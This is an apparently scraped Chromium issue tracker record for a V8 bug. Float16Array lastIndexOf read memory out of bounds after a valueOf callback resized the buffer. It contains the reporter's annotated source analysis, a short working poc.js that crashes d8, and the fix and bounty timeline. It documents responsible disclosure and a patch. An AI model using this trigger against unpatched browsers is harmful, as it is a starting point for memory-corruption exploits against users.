# Some Float16Array Built-ins Fail to Account for Side Effects Causing Array OOB Access

| Field | Value |
|-------|-------|
| **Issue ID** | [397720949](https://issues.chromium.org/issues/397720949) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Runtime |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | hu...@gmail.com |
| **Assignee** | sy...@chromium.org |
| **Created** | 2025-02-20 |
| **Bounty** | $11,000.00 |

## Description

VULNERABILITY DETAILS

I will explain what happens in the POC:

In the POC, the `f16Arr.lastIndexOf()` method invokes the `Builtin_TypedArrayPrototypeLastIndexOf()` function for processing. The process is as follows:

1. The `array->GetLength();` method is called to retrieve the length of the `f16Array`. The calculation is performed as: `arrBuffer->length() / element_size = 16 / 2 = 8`.
2. The `Object::IntegerValue(isolate, args.at<Object>(2)))` method is called to convert the `fromIdx` parameter to a `double`. **At this point, the `fromIdx.valueOf()` method is triggered, which executes `arrBuffer.resize(0)`. As a result, the actual size of `f16Array` becomes `0`. Therefore, the previously calculated `len` value of `8` is now outdated and invalid.**
3. The final calculated value of `index` is `7`. Note: Due to the side effects of the code, at this point, `index > array->GetLength()`.
4. The `elements->LastIndexOfValue()` method is called to search for the element starting from `index`.

```
BUILTIN(TypedArrayPrototypeLastIndexOf) {
  HandleScope scope(isolate);

  DirectHandle<JSTypedArray> array;
  const char* method_name = "%TypedArray%.prototype.lastIndexOf";
  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
      isolate, array,
      JSTypedArray::Validate(isolate, args.receiver(), method_name));

  // get length of typed array
  int64_t len = array->GetLength();
  if (len == 0) return Smi::FromInt(-1);

  // find from index
  int64_t index = len - 1;
  
  // If the lastIndexOf method is passed an additional fromIndex parameter
  if (args.length() > 2) { 
    // Retrieve the value of the second parameter
    // NOTICE: Object::IntegerValue() will trigger js function `fromIdx.valueOf()`
    double num;
    MAYBE_ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
        isolate, num, Object::IntegerValue(isolate, args.at<Object>(2)));
    index = std::min<int64_t>(CapRelativeIndex(num, -1, len), len - 1);
  }
  ...
  DirectHandle<Object> search_element = args.atOrUndefined(isolate, 1);

  ElementsAccessor* elements = array->GetElementsAccessor();
  // Start searching from the given index, 
  // searching backwards in the array for the position of the search_element element
  Maybe<int64_t> result =
      elements->LastIndexOfValue(array, search_element, index);
}

```

The `elements->LastIndexOfValue()` method calls the `LastIndexOfValueImpl()` method in the `TypedElementsAccessor` class to perform the search.

Note: This method is actually aware that `Object::IntegerValue()` might have side effects that could cause the `typed_array` to shrink. Therefore, it calls `typed_array->GetLength()` to retrieve the array length again before performing a general element search.

However, an interesting behavior occurs beforehand: **if the accessed array is a `Float16TypedArray` and the element being searched for is the integer `0`, the function directly accesses memory starting from `start_from` before reacquiring `typed_array->GetLength()`.** At this point, `start_from = 7`, while the actual length of `f16Array` is `0`, which will obviously result in an out-of-bounds memory access.

```
  static Maybe<int64_t> LastIndexOfValueImpl(DirectHandle<JSObject> receiver,
                                             DirectHandle<Object> value,
                                             size_t start_from) {
    ...

    if (IsBigIntTypedArrayElementsKind(Kind)) {
      ...
    } else {
      // Exit if the value to search for is not a Number
      if (!IsNumber(*value)) return Just<int64_t>(-1);

      // Convert the value to a double; 
      // if the value is an SMI, use UncheckedCast for conversion without changing the bits, rather than converting the value
      double search_value = Object::NumberValue(*value);

      if (!std::isfinite(search_value)) {
        ...
      } else if (IsFloat16TypedArrayElementsKind(Kind) && search_value == 0) { // If it is a Float16Array and the value to search for is 0
        size_t k = start_from;    // search from start_from
        do {
          // Retrieve the value of the k-th element in the data_ptr memory region
          // data_ptr has zero elements, but k=7, so OOB access Happened here
          ElementType elem_k = AccessorClass::GetImpl(data_ptr + k, is_shared);
          if (IsFloat16RawBitsZero(elem_k)) return Just<int64_t>(k);
        } while (k-- != 0);
        return Just<int64_t>(-1);
      }
      ..
    }

    // When converting the fromIdx parameter of lastIndexOf to an Integer, 
    // it might trigger the resizing of the TypedArray, so recalculate the length
    size_t typed_array_length = typed_array->GetLength();
    if (V8_UNLIKELY(start_from >= typed_array_length)) {
      DCHECK(typed_array->IsVariableLength());
      if (typed_array_length == 0) {
        return Just<int64_t>(-1);
      }
      start_from = typed_array_length - 1;
    }

    // General element search operation
    size_t k = start_from;
    do {
      ElementType elem_k = AccessorClass::GetImpl(data_ptr + k, is_shared);
      if (elem_k == typed_search_value) return Just<int64_t>(k);
    } while (k-- != 0);
    return Just<int64_t>(-1);
  }

```

The code related to the vulnerability can be traced back to the commit: `81c947baca3bc7d6432cf5d52104ffde106f0fe5`.

VERSION

The PoC has already been tested on a debug build of V8 with the commit `f94c9cfc591c23b881ddb983dd01b07b0e9ac02f`.

REPRODUCTION CASE

poc.js:

```
// Create a variable-length ArrayBuffer, with a maximum of 16 bytes
const arrBuffer = new ArrayBuffer(16, {
    "maxByteLength": 16,
});

// Create a Float16Array based on the variable-length ArrayBuffer
// Testing found that only Float16Array has a problem, Float32Array is normal
// f16Arr->length = 8
const f16Arr = new Float16Array(arrBuffer); 

// fromIdx triggers the valueOf() callback function when used as a numeric context
const fromIdx = {
    valueOf() {
        // Resize the arrBuffer to 0
        arrBuffer.resize(0);
        return 7;
    },
};

// Start from fromIdx, search for the index of ele from end to start
const ele = 0;
f16Arr.lastIndexOf(ele, fromIdx);

```

run as:

```
./d8 --js-float16array ./poc.js

```

you will get crash like that

```
Received signal 11 SEGV_ACCERR 34b70000000e

==== C stack trace ===============================
...

```

CREDIT INFORMATION

Reporter credit: 303f06e3

## Timeline

### cl...@appspot.gserviceaccount.com (2025-02-20)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6479995731902464.

### 24...@project.gserviceaccount.com (2025-02-20)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the hotlistid:4801165.

### 24...@project.gserviceaccount.com (2025-02-20)

Automatically assigning owner based on suspected regression changelist https://chromium.googlesource.com/v8/v8/+/81c947baca3bc7d6432cf5d52104ffde106f0fe5 ([float16array] Fix 0 == -0 for Float16Array builtins

Note that this CL doesn't have tests because it is already tested by
test262 with the --js-float16array flag, or once it becomes on by
default.

Bug: 42203953
Change-Id: I857de669e2c9a24fe59cd048e8bec5baab881ac5
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6265788
Reviewed-by: Ilya Rezvov <irezvov@chromium.org>
Commit-Queue: Shu-yu Guo <syg@chromium.org>
Cr-Commit-Position: refs/heads/main@{#98709}
).

If this is incorrect, please let us know why and apply the hotlistid:5433122. If you aren't the correct owner for this issue, please unassign yourself as soon as possible so it can be re-triaged.

### 24...@project.gserviceaccount.com (2025-02-20)

Detailed Report: https://clusterfuzz.com/testcase?key=6479995731902464

Fuzzer: None
Job Type: linux_asan_d8_dbg
Platform Id: linux

Crash Type: UNKNOWN READ
Crash Address: 0x77eb0000000e
Crash State:
  v8::internal::TypedElementsAccessor<
  v8::internal::ElementsAccessorBase<v8::internal::TypedElementsAccessor<
  v8::internal::Builtin_Impl_TypedArrayPrototypeLastIndexOf
  
Sanitizer: address (ASAN)

Recommended Security Severity: Medium

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=98708:98709

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6479995731902464

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


A recommended severity was added to this bug. Please change the severity if it is inaccurate.

### sy...@chromium.org (2025-02-20)

Great catch and thank you for the writeup! Fix incoming.

### ap...@google.com (2025-02-20)

Project: v8/v8  

Branch: main  

Author: Shu-yu Guo <[syg@chromium.org](mailto:syg@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6284136>

[float16array] Fix lastIndexOf

---


Expand for full commit details
```
[float16array] Fix lastIndexOf 
 
When special casing 0 in Float16Array lastIndexOf, do the search after 
accounting for user code resizing the buffer. 
 
Bug: 42203953 
Change-Id: Ic9e983cd9857644b226211774c12acd47076f854 
Fixed: 397720949 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6284136 
Reviewed-by: Ilya Rezvov <irezvov@chromium.org> 
Commit-Queue: Shu-yu Guo <syg@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#98844}

```

---

Files:

- M `src/objects/elements-kind.h`
- M `src/objects/elements.cc`
- A `test/mjsunit/regress/regress-397720949.js`

---

Hash: 3e097c3eb753c0459958708a5ae2dff885127810  

Date:  Thu Feb 20 07:55:32 2025


---

### ph...@google.com (2025-02-20)

Setting milestone because of s2 severity.

### ph...@google.com (2025-02-20)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### 24...@project.gserviceaccount.com (2025-02-21)

ClusterFuzz testcase 6479995731902464 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8_dbg&range=98843:98844

If this is incorrect, please add the hotlistid:5433040 and re-open the issue.

### sp...@google.com (2025-02-27)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $11000.00 for this report.

Rationale for this decision:
$10,000 for high-quality report of memory corruption in a sandboxed process / the renderer + $1,000 bisect bonus


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-02-27)

Congratulations 303f06e3! Thank you for your efforts on another solid report and reporting this issue to us!

### ch...@google.com (2025-03-05)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to dev. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M135. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
**Merge approved:** your change passed merge requirements and is auto-approved for M135. Please go ahead and merge the CL to branch 7049 (refs/branch-heads/7049) manually. Please contact milestone owner if you have questions.
Merge instructions: <https://chromium.googlesource.com/chromium/src.git/+/refs/heads/main/docs/process/merge_request.md>
Owners: alonbajayo (ChromeOS), pbommana (Desktop US), danielyip (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)
Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [135].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### pb...@google.com (2025-03-06)

Your Merge request has been approved, Please land your merge as soon as possible, to ensure the change is included in next week's RC build for Beta release, please complete your merges to M135 on or before 1pm PST on Tuesday March-11th. Thank you


### da...@google.com (2025-03-11)

Fix actually landed in M135 so no need to CP.
<https://chromiumdash.appspot.com/commit/3e097c3eb753c0459958708a5ae2dff885127810>

### pe...@google.com (2025-03-11)

LTS Milestone M132

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### qk...@google.com (2025-03-13)

Labelling as not applicable for LTS 132 and 126 because the suspected CL[1]  isn't present in M132 and M126.

[1] https://chromium-review.googlesource.com/c/v8/v8/+/6265788

### ch...@google.com (2025-05-30)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/397720949)*
